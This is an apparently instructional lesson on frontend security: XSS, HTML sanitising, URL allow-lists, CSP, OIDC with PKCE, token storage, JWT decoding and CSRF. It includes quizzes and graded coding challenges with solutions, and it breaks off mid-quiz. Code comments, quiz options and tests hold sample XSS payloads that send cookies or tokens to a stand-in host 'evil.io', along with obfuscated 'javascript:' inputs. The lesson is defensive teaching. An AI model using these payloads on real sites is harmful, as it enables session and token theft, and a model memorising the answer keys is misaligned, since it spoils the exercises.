---
id: fe-25
title: Frontend Security & Auth
level: expert
minutes: 60
xp: 230
summary: XSS and sanitising, Content Security Policy, OIDC Authorization Code + PKCE with Keycloak/Entra, where tokens belong (memory, cookies, BFF), CSRF, CORS and why VITE_ variables are public.
---

The browser is **hostile territory**. Everything you ship — every line of JavaScript, every environment
variable baked into the bundle, every token you store — can be read and modified by whoever is sitting at the
keyboard, and by any script that manages to run on your page. Frontend security is therefore about two things:

1. **Not letting attacker-controlled data become code** (XSS).
2. **Not giving the browser secrets it can't keep** (tokens, keys) — and designing auth around that fact.

The real enforcement always happens on the server. But a careless frontend can hand an attacker the keys before the
server ever gets a say.

Two words you'll see in every section below:

- An **origin** is *scheme + host + port*: `https://app.devquest.test` and `https://app.devquest.test:8443` are
  different origins, and so are `http://…` and `https://…`. The browser's **same-origin policy** keeps scripts from
  one origin from reading another origin's data (DOM, storage, responses).
- A **site** is looser: the registrable domain plus scheme. `https://app.devquest.test` and
  `https://api.devquest.test` are *different origins* but the *same site*. Cookies are scoped by domain
  (host-only by default, or `Domain=` to include subdomains) and path; the `SameSite` attribute is what uses the
  *site* concept. CORS, `postMessage` and storage work on origins.

## Cross-site scripting (XSS)

XSS means an attacker gets **their JavaScript to run in your origin**. Once that happens, the same-origin policy no
longer protects you, because the attacker *is* your origin: they can do anything your code can — read
`localStorage`, call your API with the user's session, change the page, exfiltrate data.

The vocabulary: a **source** is where untrusted data comes from (an API field, the URL, `postMessage`), and a
**sink** is an API that turns a string into code or markup (`innerHTML`, `eval`, a `javascript:` URL). XSS happens
whenever data flows from a source to a sink without being escaped or validated.

| Kind | How the script gets in | Example |
|---|---|---|
| **Stored** | Saved in your database, rendered to other users | A card description containing `<img src=x onerror=…>` |
| **Reflected** | Comes from the URL, echoed by the server | `/search?q=<script>…</script>` |
| **DOM-based** | Client code moves URL/user data into a dangerous sink | `el.innerHTML = location.hash.slice(1)` |

### What React protects you from — and what it doesn't

React **escapes text** by default. This is safe no matter what `comment.body` contains:

```tsx
<p>{comment.body}</p>   // "<script>" is rendered as the literal characters < s c r i p t >
```

The escape hatches are where XSS lives:

```tsx
// 1. Raw HTML — the name is a warning
<div dangerouslySetInnerHTML={{ __html: comment.html }} />

// 2. URLs — attributes are not "text"
<a href={user.website}>Website</a>        // "javascript:fetch('//evil.io?c='+document.cookie)"

// 3. Bypassing React entirely
ref.current.innerHTML = markdownToHtml(input)
new Function(userFormula)()                // or eval, setTimeout('string')

// 4. Server-rendered state injected into HTML without escaping
<script>window.__STATE__ = ${JSON.stringify(state)}</script>   // "</script><script>…" breaks out
```

```tsx
// 5. srcDoc — an iframe whose HTML you supply runs in YOUR origin (unless sandboxed)
<iframe srcDoc={widget.html} />
```

React 19 replaces `javascript:` URLs in `href`, `src`, `action` and `formAction` with a URL that just throws an
error — a useful safety net, but don't lean on it: it only covers React-rendered attributes, it doesn't touch
`innerHTML`, `srcDoc`, third-party widgets or non-React code, and a link that silently does nothing is still a bug.
Validate URLs yourself (below) so bad values are rejected when they're *saved*, not just when they're rendered.

:::warn title="Common mistake: escaping in the wrong context"
Escaping is context-specific. HTML-escaping (`&lt;`) makes a string safe as element *text* or a quoted attribute
value, but it does nothing for a URL (`javascript:alert(1)` contains no `<` or `"`), for code inside a `<script>`
block, or for CSS. That's why each sink in the list above needs its own defence.
:::

### Sanitising HTML you must render

Sometimes rendering user HTML is the feature: rich-text comments, CMS content, Markdown previews. Then you
**sanitise** — parse the HTML and keep only an allow-list of harmless tags and attributes. Use a battle-tested
library; never a regex.

```tsx
import { useMemo } from 'react'
import DOMPurify from 'dompurify'

function RichText({ html }: { html: string }) {
  const clean = useMemo(() => DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'code', 'pre', 'br'],
    ALLOWED_ATTR: ['href'],
  }), [html])
  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />
}
```

Why an **allow-list** (name what's permitted) rather than a deny-list (name what's forbidden)? Because HTML has
hundreds of tags and event attributes, browsers keep adding new ones, and parsers forgive broken markup in
surprising ways — a deny-list is always one trick behind. DOMPurify also checks URL attributes for you: with the
config above, `<a href="javascript:…">` keeps its text but loses the `href`.

Sanitise **on output** in the client (and ideally also on input on the server). For Markdown, prefer a renderer
that produces React elements (`react-markdown`) with raw HTML disabled, so there is no `innerHTML` at all.

:::quiz id=fe-25-q1 xp=15
Which of these can lead to XSS in a React 19 app? (Select all that apply.)
- [ ] `<h2>{project.name}</h2>` where `name` is `<img src=x onerror=alert(1)>`
- [x] `<div dangerouslySetInnerHTML={{ __html: project.descriptionHtml }} />` without sanitising
- [x] `<iframe srcDoc={user.widgetHtml} />` where `widgetHtml` is `<script>fetch('//evil.io?c=' + localStorage.token)</script>`
- [x] `containerRef.current.innerHTML = searchParams.get('msg')`
- [ ] `<input value={query} />` where `query` contains `"><script>`
> React escapes children and attribute *values*, so the heading renders the literal text `<img …>` and the input
> simply shows `"><script>` in the box — the quote can't break out of an attribute React writes through the DOM.
> `dangerouslySetInnerHTML` and `innerHTML` hand a string straight to the HTML parser, and an un-sandboxed
> `srcDoc` iframe runs its scripts **in your origin**, with full access to your storage.
:::

:::challenge id=fe-25-c1 lang=ts xp=30
title: Escape HTML like React does
Sometimes you build HTML strings outside React (an email template preview, a tooltip library, a `document.title`
helper). Implement `escapeHtml(s)` that replaces the five significant characters:
`&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`.

Two traps to avoid: `String.prototype.replace` with a *string* pattern only replaces the **first** match, and the
order matters — if you turn `<` into `&lt;` and *then* escape `&`, you get `&amp;lt;` and the user sees `&lt;`
on screen.

hint: Replace `&` **first**, or use a single regex with a lookup map: `s.replace(/[&<>"']/g, (c) => map[c])`.

```ts starter
export function escapeHtml(s: string): string {
  return s.replace('<', '&lt;').replace('>', '&gt;')
}
```

```ts solution
const ENTITIES: Record<string, string> = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }

export function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => ENTITIES[c])
}
```

```ts tests
test('escapes tags', () => {
  expect(escapeHtml('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;')
})
test('escapes quotes so attributes cannot be broken out of', () => {
  expect(escapeHtml(`" onmouseover='x'`)).toBe('&quot; onmouseover=&#39;x&#39;')
})
test('escapes & without double-escaping its own output', () => {
  expect(escapeHtml('Tom & Jerry <3')).toBe('Tom &amp; Jerry &lt;3')
  expect(escapeHtml('&lt;')).toBe('&amp;lt;')
})
test('leaves normal text alone', () => {
  expect(escapeHtml('Plain text, 100% safe.')).toBe('Plain text, 100% safe.')
})
```
:::

### Validating URLs

User-supplied links (profile website, card attachments, "return to" parameters) need an **allow-list of
schemes**. Deny-lists lose: browsers ignore leading whitespace and control characters, strip tabs and newlines
inside the scheme, and match it case-insensitively — `" JaVa\tScRiPt:alert(1)"` is still `javascript:`. The robust
approach is to let the **URL parser** normalise it and check the resulting `protocol`.

:::challenge id=fe-25-c2 lang=ts xp=50
title: Allow-list URL schemes
Implement `isSafeUrl(input)`:

- Parse with `new URL(input, 'https://app.devquest.test')` (the base makes relative URLs like `/docs` or `#top` valid).
- Return `true` only if the resulting `protocol` is `http:`, `https:` or `mailto:`.
- Unparseable input → `false` (don't throw).

hint: Wrap `new URL(...)` in `try/catch`.
hint: The parser already lower-cases the scheme and strips leading spaces/control characters and embedded tabs/newlines.

```ts starter
export function isSafeUrl(input: string): boolean {
  return !input.startsWith('javascript:')
}
```

```ts solution
const SAFE_PROTOCOLS = ['http:', 'https:', 'mailto:']

export function isSafeUrl(input: string): boolean {
  try {
    return SAFE_PROTOCOLS.includes(new URL(input, 'https://app.devquest.test').protocol)
  } catch {
    return false
  }
}
```

```ts tests
test('normal links are fine', () => {
  for (const u of ['https://example.com', 'http://localhost:5173/x', 'mailto:hi@example.com', '/projects/1', '#top', 'docs/setup'])
    expect(isSafeUrl(u)).toBe(true)
})
test('script-ish schemes are rejected', () => {
  for (const u of ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)'])
    expect(isSafeUrl(u)).toBe(false)
})
test('obfuscated javascript: is rejected', () => {
  for (const u of ['JaVaScRiPt:alert(1)', '  javascript:alert(1)', 'java\tscript:alert(1)', '\u0001javascript:alert(1)', 'java\nscript:alert(1)'])
    expect(isSafeUrl(u)).toBe(false)
})
test('garbage does not throw', () => {
  expect(isSafeUrl('http://[::1')).toBe(false)
})
```
:::

:::challenge id=fe-25-c3 lang=tsx xp=50 preview=Links
title: A SafeLink component
Build `SafeLink({ href, children })` for user-supplied links. `isSafeUrl` and `APP_ORIGIN` are provided (setup).

- Unsafe `href` → render the children inside a `<span>` (no link at all).
- Safe and **same origin** as `APP_ORIGIN` (relative URLs count) → a normal `<a href>`.
- Safe and **external** → `<a href target="_blank" rel="noopener noreferrer">` so the new tab can't script
  `window.opener` and doesn't receive a `Referer` with your internal URLs.

hint: `new URL(href, APP_ORIGIN).origin === APP_ORIGIN` tells you whether it's internal.

```tsx setup
const APP_ORIGIN = 'https://app.devquest.test'
function isSafeUrl(input: string): boolean {
  try { return ['http:', 'https:', 'mailto:'].includes(new URL(input, APP_ORIGIN).protocol) } catch { return false }
}
```

```tsx starter
export function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  return <a href={href}>{children}</a>
}

export function Links() {
  return (
    <ul>
      <li><SafeLink href="/projects">Projects</SafeLink></li>
      <li><SafeLink href="https://react.dev">React docs</SafeLink></li>
      <li><SafeLink href="javascript:alert(1)">Totally legit</SafeLink></li>
    </ul>
  )
}
```

```tsx solution
export function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  if (!isSafeUrl(href)) return <span>{children}</span>
  const external = new URL(href, APP_ORIGIN).origin !== APP_ORIGIN
  return external
    ? <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>
    : <a href={href}>{children}</a>
}

export function Links() {
  return (
    <ul>
      <li><SafeLink href="/projects">Projects</SafeLink></li>
      <li><SafeLink href="https://react.dev">React docs</SafeLink></li>
      <li><SafeLink href="javascript:alert(1)">Totally legit</SafeLink></li>
    </ul>
  )
}
```

```tsx tests
test('internal links stay in the tab', () => {
  render(<SafeLink href="/projects/42">Project</SafeLink>)
  const a = screen.getByRole('link', { name: 'Project' })
  expect(a).toHaveAttribute('href', '/projects/42')
  expect(a.hasAttribute('target')).toBe(false)
})
test('absolute same-origin link is internal too', () => {
  render(<SafeLink href="https://app.devquest.test/settings">Settings</SafeLink>)
  expect(screen.getByRole('link', { name: 'Settings' }).hasAttribute('target')).toBe(false)
})
test('external links open safely in a new tab', () => {
  render(<SafeLink href="https://react.dev">React</SafeLink>)
  const a = screen.getByRole('link', { name: 'React' })
  expect(a).toHaveAttribute('target', '_blank')
  expect(a).toHaveAttribute('rel', 'noopener noreferrer')
})
test('unsafe URLs are not links at all', () => {
  render(<SafeLink href=" JavaScript:alert(1)">Click me</SafeLink>)
  expect(screen.queryByRole('link')).toBeNull()
  expect(screen.getByText('Click me')).toBeInTheDocument()
})
```
:::

## Content Security Policy: the second line of defence

Even careful teams ship an XSS bug eventually. A **Content Security Policy** is an HTTP response header that
tells the browser which sources of script, style, images and connections are allowed. The key idea: once
`script-src` is set and does **not** contain `'unsafe-inline'`, the browser refuses to run *any* inline script —
`<script>…</script>` blocks, `onerror=` / `onclick=` attributes, `javascript:` URLs. Since almost every injected
payload is inline, the XSS bug is still there but the payload simply doesn't run.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data: https://cdn.devquest.test;
  connect-src 'self' https://api.devquest.test wss://api.devquest.test https://auth.devquest.test;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  upgrade-insecure-requests
```

- A Vite **production build** emits only external `<script type="module" src="/assets/…">` files, so
  `script-src 'self'` works without `'unsafe-inline'`. (The dev server injects inline scripts for HMR — apply
  the strict CSP to the built app, not to `vite dev`.)
- `connect-src` must list your API, the SignalR WebSocket (`wss:`) and the identity provider.
- `frame-ancestors 'none'` stops clickjacking (your app inside an attacker's iframe).
- Roll out with **`Content-Security-Policy-Report-Only`** first and collect violation reports; then enforce.
- If you need inline scripts (analytics snippets), use a per-response **nonce** plus `'strict-dynamic'` rather than `'unsafe-inline'`.
  A nonce is a fresh random value the server puts both in the header (`script-src 'nonce-r4nd0m'`) and on the
  allowed tag (`<script nonce="r4nd0m">`); an attacker can't guess it, so their injected tag is refused.
- `style-src 'self'` breaks CSS-in-JS libraries that inject `<style>` tags at runtime (Emotion, styled-components)
  unless they get the nonce too. Vite's `html.cspNonce` option adds a nonce placeholder to the tags it emits, which
  your server replaces per response. Tailwind / CSS modules produce plain `.css` files and need nothing special.
- **Trusted Types** (`require-trusted-types-for 'script'`) go further: the browser rejects raw strings in
  `innerHTML` and friends unless they pass through a policy (e.g. DOMPurify's).

The header is set where the HTML is served — nginx, the ASP.NET Core host (`app.Use` middleware), a CDN — not in React.
A `<meta http-equiv="Content-Security-Policy">` tag works for most directives, but not `frame-ancestors` or
report-only mode, so prefer the real header.

:::quiz id=fe-25-q4 xp=10
Your production CSP is `script-src 'self'; object-src 'none'`. A stored-XSS bug lets an attacker save the comment
`<img src=x onerror="fetch('//evil.io?c='+document.cookie)">`, which your app renders with unsanitised
`dangerouslySetInnerHTML`. What happens in a modern browser?
- [ ] The payload runs — CSP only restricts `<script>` tags, not event-handler attributes
- [x] The broken image renders, but the `onerror` handler is blocked and a CSP violation is reported in the console
- [ ] The whole page is blocked from rendering because it contains inline code
- [ ] The payload runs, because `img-src` was not restricted
> Without `'unsafe-inline'`, `script-src` forbids **all** inline script, and inline event handlers count as inline
> script. The `<img>` element itself is harmless markup, so it still renders; only the code is refused. `img-src`
> controls where images may load from, not whether handlers run. CSP is the safety net — the bug (unsanitised HTML)
> still needs fixing.
:::

## Authentication: OIDC Authorization Code + PKCE

Modern apps don't handle passwords themselves. An **identity provider** (IdP) — Keycloak, Microsoft Entra ID,
Auth0, Okta — does sign-in, MFA, password resets and social logins, and issues tokens via **OpenID Connect**
(OIDC, an identity layer on top of OAuth 2.0).

The cast:

| Role | In our stack |
|---|---|
| **User** | A person in a browser |
| **Client** | Your React SPA (a *public* client: it can't keep a secret) — or your BFF (a *confidential* client) |
| **Authorization server / IdP** | Keycloak realm or Entra tenant |
| **Resource server** | Your ASP.NET Core API, which validates access tokens |

The tokens:

- **ID token** (JWT) — *who the user is*, for the client. Never send it to APIs as a credential.
- **Access token** — *what the bearer may do*, for the API (`Authorization: Bearer …`). Short-lived (5–15 min).
- **Refresh token** — gets new access tokens without a new sign-in. The most valuable secret of the three.

### The flow

```text
SPA                                   IdP (Keycloak / Entra)                  API
 │ 1. create code_verifier (random)     │                                      │
 │    code_challenge = BASE64URL(SHA256(verifier))                             │
 │ 2. redirect ───────────────────────► │ /authorize?response_type=code        │
 │                                      │   &client_id=board-spa               │
 │                                      │   &redirect_uri=https://app/callback │
 │                                      │   &scope=openid profile board-api    │
 │                                      │   &code_challenge=…&code_challenge_method=S256
 │                                      │   &state=…  (CSRF protection for the redirect)
 │                                      │ 3. user signs in (+ MFA)             │
 │ ◄────────────── 4. redirect to /callback?code=abc&state=…                   │
 │ 5. POST /token  code=abc + code_verifier ───► │ checks SHA256(verifier) == challenge
 │ ◄─────────────────────── 6. { access_token, id_token, refresh_token }        │
 │ 7. GET /api/projects  Authorization: Bearer <access_token> ─────────────────► │ validates signature, iss, aud, exp
```

**Why PKCE?** The authorization `code` travels through the browser's address bar, where it can leak (browser
history, logs, a malicious extension, another app registered for the same redirect on mobile). Without PKCE,
whoever holds the code can redeem it. With PKCE, redeeming the code also requires the **`code_verifier`**, which
never left your app — the IdP only ever saw its hash, and a SHA-256 hash can't be reversed. The old **implicit
flow** (tokens directly in the URL fragment) is deprecated for exactly this kind of reason: the OAuth 2.0 Security
Best Current Practice (RFC 9700, 2025) says not to use it and recommends PKCE for *every* client, and the upcoming
OAuth 2.1 makes code + PKCE the only browser flow.

**And `state`?** It protects the *redirect back to you*: the app stores a random `state` before redirecting and
rejects a callback whose `state` doesn't match. Without it, an attacker could trick your browser into completing
*their* sign-in (you'd end up logged in as the attacker and type your data into their account). PKCE and `state`
defend different steps; the libraries send both.

In practice you use a certified library, not hand-written OAuth:

```tsx
// main.tsx — react-oidc-context wraps oidc-client-ts
import { createRoot } from 'react-dom/client'
import { AuthProvider, type AuthProviderProps } from 'react-oidc-context'
import { InMemoryWebStorage, WebStorageStateStore } from 'oidc-client-ts'
import { App } from './App'

const oidc: AuthProviderProps = {
  authority: import.meta.env.VITE_OIDC_AUTHORITY,   // Keycloak: https://auth.devquest.test/realms/devquest
                                                    // Entra:    https://login.microsoftonline.com/<tenant>/v2.0
  client_id: import.meta.env.VITE_OIDC_CLIENT_ID,   // 'board-spa' — public, so fine in VITE_*
  redirect_uri: `${window.location.origin}/callback`,
  scope: 'openid profile email board-api',
  // Default is sessionStorage. In memory = nothing for an XSS payload to dump, but a reload needs a silent re-auth.
  userStore: new WebStorageStateStore({ store: new InMemoryWebStorage() }),
  onSigninCallback: () => window.history.replaceState({}, document.title, '/'),  // drop ?code=&state= from the URL
}

createRoot(document.getElementById('root')!).render(<AuthProvider {...oidc}><App /></AuthProvider>)
```

```tsx
function AccountButton() {
  const auth = useAuth()
  if (auth.isLoading) return <Spinner label="Signing in" />
  if (!auth.isAuthenticated) return <button onClick={() => auth.signinRedirect()}>Sign in</button>
  return <button onClick={() => auth.signoutRedirect()}>Sign out {auth.user?.profile.name}</button>
}
```

:::challenge id=fe-25-c4 lang=ts xp=50
title: PKCE building blocks
The PKCE `code_verifier` is 43–128 characters from `[A-Za-z0-9-._~]`; libraries create it as **base64url** of
32 random bytes. Implement:

- `base64UrlEncode(bytes: Uint8Array)` — standard base64 (`btoa` over a binary string), then `+` → `-`,
  `/` → `_`, and strip trailing `=` padding.
- `createCodeVerifier(randomBytes)` — `randomBytes(32)` returns a `Uint8Array` (in the browser that would be
  `crypto.getRandomValues(new Uint8Array(32))`); return its base64url encoding.

(The challenge is then `base64UrlEncode(new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier))))`.)

hint: `let bin = ''; for (const b of bytes) bin += String.fromCharCode(b)` builds the binary string for `btoa`.
hint: `.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')`

```ts starter
export function base64UrlEncode(bytes: Uint8Array): string {
  let bin = ''
  for (const b of bytes) bin += String.fromCharCode(b)
  return btoa(bin)
}

export function createCodeVerifier(randomBytes: (n: number) => Uint8Array): string {
  return base64UrlEncode(randomBytes(16))
}
```

```ts solution
export function base64UrlEncode(bytes: Uint8Array): string {
  let bin = ''
  for (const b of bytes) bin += String.fromCharCode(b)
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

export function createCodeVerifier(randomBytes: (n: number) => Uint8Array): string {
  return base64UrlEncode(randomBytes(32))
}
```

```ts tests
test('url-safe alphabet and no padding', () => {
  expect(base64UrlEncode(new Uint8Array([251, 255]))).toBe('-_8')
  expect(base64UrlEncode(new Uint8Array([104, 105]))).toBe('aGk')
  expect(base64UrlEncode(new Uint8Array([104, 105, 33]))).toBe('aGkh')
})
test('RFC 7636 appendix B verifier', () => {
  const bytes = new Uint8Array([116, 24, 223, 180, 151, 153, 224, 37, 79, 250, 96, 125, 216, 173, 187, 186, 22, 212, 37, 77, 105, 214, 191, 240, 91, 88, 5, 88, 83, 132, 141, 121])
  expect(base64UrlEncode(bytes)).toBe('dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk')
})
test('verifier uses 32 bytes → 43 chars from the allowed set', () => {
  const asked: number[] = []
  const v = createCodeVerifier((n) => { asked.push(n); return new Uint8Array(n).map((_, i) => (i * 37 + 11) % 256) })
  expect(asked).toEqual([32])
  expect(v).toHaveLength(43)
  expect(/^[A-Za-z0-9\-._~]+$/.test(v)).toBe(true)
})
```
:::

## Where do tokens live?

This is the most argued-about question in SPA security. The honest summary: **any token JavaScript can read, an
XSS attack can read too.** Options from weakest to strongest:

| Storage | Survives reload | Readable by XSS | Notes |
|---|---|---|---|
| `localStorage` | ✅ | ✅ — and persists for days | Easy, common, worst. A single XSS = long-lived token theft. |
| `sessionStorage` | per tab | ✅ | Slightly smaller window; same core problem. |
| In memory (a JS variable) | ❌ — silent re-auth on reload | Harder (no storage to dump), but script can still call APIs as the user | Pair with short-lived tokens and **refresh-token rotation**. |
| **HttpOnly cookie via a BFF** | ✅ | ❌ — JS never sees a token | Recommended by the IETF *OAuth 2.0 for Browser-Based Apps* draft for sensitive apps. |

Two terms from that table:

- **Refresh-token rotation**: every time the SPA uses a refresh token, the IdP returns a *new* one and invalidates
  the old. If a stolen copy is ever used after the real app has rotated it, the IdP sees the reuse and revokes the
  whole chain — so a leaked refresh token has a short useful life.
- **Silent re-auth**: after a reload, an in-memory app has no tokens, so the library asks the IdP for new ones
  without showing UI (typically a hidden iframe with `prompt=none`, which reuses the IdP's own session cookie;
  apps that keep the refresh token in `sessionStorage` can use it instead, at the cost of making it readable by
  XSS). The iframe variant relies on that IdP session cookie, which browsers increasingly **block as a third-party cookie** when the IdP lives on another site.
  That fragility is one more reason teams move to a BFF.

Notice the in-memory row: hiding the token doesn't make XSS harmless. Injected script can't *steal* the token, but
it can still call `fetch('/api/…')` through your own code while the user has the tab open. XSS prevention and CSP
remain the real fix; storage choice only limits how much damage outlives the page.

### The BFF pattern (Backend-for-Frontend)

A **BFF** is a thin server component (often the same ASP.NET Core app that serves the SPA) that acts as the OIDC
**confidential client**:

```text
Browser (SPA)  ──cookie──►  BFF (ASP.NET Core)  ──Bearer token──►  API(s)
   no tokens                 - does code+PKCE flow with Keycloak/Entra
                             - stores tokens server-side
                             - issues an HttpOnly; Secure; SameSite=Lax session cookie
                             - proxies /api/* and attaches the access token (YARP / Duende.BFF)
```

Why `Lax` and not `Strict`? Sign-in ends with the IdP (a *different site*) redirecting the browser back to
`/signin-oidc`, and users arrive from links in emails and chat. With `Strict` the browser withholds the cookie on
those cross-site top-level navigations, so the first page after sign-in, or after clicking a link, looks logged out
even though the session exists. `Lax` still sends the cookie on top-level `GET` navigations but withholds it on
cross-site `POST`s and sub-requests, which is where CSRF lives. The rest of the CSRF defence (a required custom
header) comes in the CSRF section below. `Lax` is also what ASP.NET Core's cookie authentication handler uses by default.

The SPA just calls `fetch('/api/projects')` with the cookie. Tokens never touch JavaScript, refresh happens
server-side, and logout can revoke everything centrally. The cost: a stateful server component and the need for
**CSRF protection**, because cookies are sent automatically.

:::job title="What you'll find in real projects"
- Internal tools and B2B SaaS on .NET often use the **BFF** (Duende.BFF or a custom YARP + cookie setup).
- Many SPAs use **oidc-client-ts / MSAL.js** with tokens in memory or `sessionStorage`, short access-token
  lifetimes and refresh-token rotation — acceptable when paired with a strict CSP.
- Expect a security review to ask: *Where are tokens stored? What's the access-token lifetime? Is there a CSP?*
  Have answers ready.
:::

:::quiz id=fe-25-q2 xp=10
What does PKCE protect against?
- [ ] XSS stealing tokens from `localStorage`
- [x] An attacker who intercepts the authorization `code` redeeming it for tokens
- [ ] CSRF attacks on your API
- [ ] Users choosing weak passwords
> The code alone is useless without the `code_verifier`, which never left the app. PKCE does nothing for tokens
> that are already in the browser — once the exchange is done, an XSS payload can read them wherever JS can; that's
> what CSP and storage choices are for. CSRF on your API is about cookies being auto-attached (SameSite, custom
> headers), and password strength is the IdP's policy — neither involves the authorization code.
:::

:::quiz id=fe-25-q5 xp=10
Spot the problem. A teammate's PR says: *"Admins only: the Delete-project button now renders only when the JWT
payload contains `roles: ['admin']`, so the `DELETE /api/projects/:id` endpoint is protected."*
- [ ] Nothing — decoding the JWT on the client is exactly how role checks work
- [ ] The check should use the ID token instead of the access token
- [x] Hiding the button is UX only; anyone can send the `DELETE` with curl, so the API itself must check the role
- [ ] The roles claim should be stored in `localStorage` so the check survives a reload
> The browser is controlled by the user: they can edit the bundle, fake a payload, or skip the UI entirely and call
> the endpoint directly. Only the API, which **verifies the token's signature**, may make authorization decisions
> (`[Authorize(Roles = "admin")]` or a policy). Showing or hiding the button is a fine UX touch on top. Switching to
> the ID token changes nothing — the client still can't enforce anything.
:::

## Reading a JWT (without trusting it)

A JWT is `header.payload.signature`: the first two parts are base64url-encoded JSON, the third is a signature over
them. **Base64url is an encoding, not encryption** — anyone holding the token can read the payload (paste one into
a decoder and see), so never put secrets in claims.

The client may **decode** the payload to read display info (`name`, `exp`) — but must **never make security
decisions** from it: the client can't verify the signature meaningfully, and the user can change anything the
browser runs. Only the API, which **verifies the signature** against the IdP's public keys (published as a
**JWKS**, a JSON Web Key Set), may trust its claims. Client-side checks are UX: "your session expires in 2
minutes", "refresh before calling the API".

Why the skew in the exercise below? The user's clock and the server's clock are never exactly in sync, and the
request needs time to travel. If you refresh only when `exp` has *already* passed, a token that looked valid when
you sent it can arrive expired and earn a 401. Treating it as expired a few seconds early avoids that race.

:::challenge id=fe-25-c5 lang=ts xp=50
title: Decode a JWT payload and check expiry
Implement:

- `decodeJwtPayload(token)` — split on `.`, take the middle part, convert base64url → base64 (`-` → `+`, `_` → `/`,
  pad with `=` to a multiple of 4), `atob` it, decode the bytes as **UTF-8** (names can contain `ë`, `ł`, `中`),
  `JSON.parse`. Throw `Error('Malformed JWT')` if there aren't exactly 3 parts.
- `isExpired(token, nowSeconds, skewSeconds = 30)` — `true` when `exp` is missing, or when
  `nowSeconds + skewSeconds >= exp` (refresh a little *before* expiry to absorb clock skew).

hint: `Uint8Array.from(atob(b64), (c) => c.charCodeAt(0))` then `new TextDecoder().decode(bytes)`.
hint: Padding: `b64 + '='.repeat((4 - (b64.length % 4)) % 4)`.

```ts starter
export function decodeJwtPayload(token: string): Record<string, unknown> {
  return JSON.parse(atob(token.split('.')[1]))
}

export function isExpired(token: string, nowSeconds: number, skewSeconds = 30): boolean {
  const { exp } = decodeJwtPayload(token) as { exp?: number }
  return nowSeconds > (exp ?? 0)
}
```

```ts solution
export function decodeJwtPayload(token: string): Record<string, unknown> {
  const parts = token.split('.')
  if (parts.length !== 3) throw new Error('Malformed JWT')
  const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/')
  const padded = b64 + '='.repeat((4 - (b64.length % 4)) % 4)
  const bytes = Uint8Array.from(atob(padded), (c) => c.charCodeAt(0))
  return JSON.parse(new TextDecoder().decode(bytes))
}

export function isExpired(token: string, nowSeconds: number, skewSeconds = 30): boolean {
  const { exp } = decodeJwtPayload(token) as { exp?: number }
  if (typeof exp !== 'number') return true
  return nowSeconds + skewSeconds >= exp
}
```

```ts tests
function makeJwt(payload: object) {
  const enc = (o: object) => {
    let bin = ''
    for (const b of new TextEncoder().encode(JSON.stringify(o))) bin += String.fromCharCode(b)
    return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
  }
  return `${enc({ alg: 'RS256', typ: 'JWT' })}.${enc(payload)}.fake-signature`
}
test('decodes a payload with non-ASCII characters', () => {
  const t = makeJwt({ sub: '42', name: 'Zoë Łukasz 中', exp: 2000 })
  expect(decodeJwtPayload(t)).toEqual({ sub: '42', name: 'Zoë Łukasz 中', exp: 2000 })
})
test('handles base64url characters and missing padding', () => {
  const t = makeJwt({ a: '>>>???' })
  expect(decodeJwtPayload(t)).toEqual({ a: '>>>???' })
})
test('rejects malformed tokens', () => {
  expect(() => decodeJwtPayload('abc.def')).toThrow('Malformed JWT')
})
test('expiry with skew', () => {
  const t = makeJwt({ exp: 1000 })
  expect(isExpired(t, 900)).toBe(false)
  expect(isExpired(t, 970)).toBe(true)
  expect(isExpired(t, 960, 0)).toBe(false)
  expect(isExpired(t, 1000, 0)).toBe(true)
})
test('no exp means expired', () => {
  expect(isExpired(makeJwt({ sub: '1' }), 0)).toBe(true)
})
```
:::

## CSRF: the cookie's dark side

Cookies are attached **automatically** to requests to their site — including requests triggered by *another*
site. Cross-Site Request Forgery abuses this: `evil.io` auto-submits a form to `POST https://app.devquest.test/api/projects/42/delete`,
and the browser helpfully adds your session cookie.

Defences (combine them):

- **`SameSite` cookies.** `SameSite=Lax` withholds the cookie on cross-site sub-requests and `POST`s, but still
  sends it when the user follows a link (a top-level `GET` navigation); `SameSite=Strict` withholds it on every
  cross-site request. Chromium treats cookies *without* the attribute as `Lax`, but other browsers don't — so set
  it explicitly. Remember it is about **sites**: a compromised `blog.devquest.test` is *same-site* with
  `app.devquest.test`, so SameSite alone doesn't protect you from sibling subdomains.
- **Require a custom header** on state-changing requests (`X-CSRF: 1`). Cross-site HTML forms can't set custom
  headers, and a cross-site `fetch` with one triggers a CORS preflight that your server rejects. Duende.BFF uses
  exactly this.
- **Anti-forgery tokens** (ASP.NET Core's `[ValidateAntiForgeryToken]` / `IAntiforgery`) for classic form posts.
- Never change state on `GET` — `Lax` cookies still ride along when another site navigates the user to your URL
  (a link, a redirect, `window.location = …`).

Bearer tokens in an `Authorization` header are *not* CSRF-able (the attacker's page can't add the header) — which
is precisely the trade-off: header tokens are CSRF-proof but XSS-readable; HttpOnly cookies are XSS-proof but need CSRF defences.

:::quiz id=fe-25-q3 xp=10
Your BFF uses an `HttpOnly; Secure; SameSite=Lax` session cookie. Which additional measure best protects `POST /api/*`
from CSRF?
- [ ] Storing a copy of the session id in `localStorage`
- [x] Requiring a custom header such as `X-CSRF: 1` on every API call and rejecting requests without it
- [ ] Setting `Access-Control-Allow-Origin: *`
- [ ] Switching all mutations to `GET` requests
> A custom header can't be added by a cross-site form, and adding it from cross-site JavaScript forces a CORS
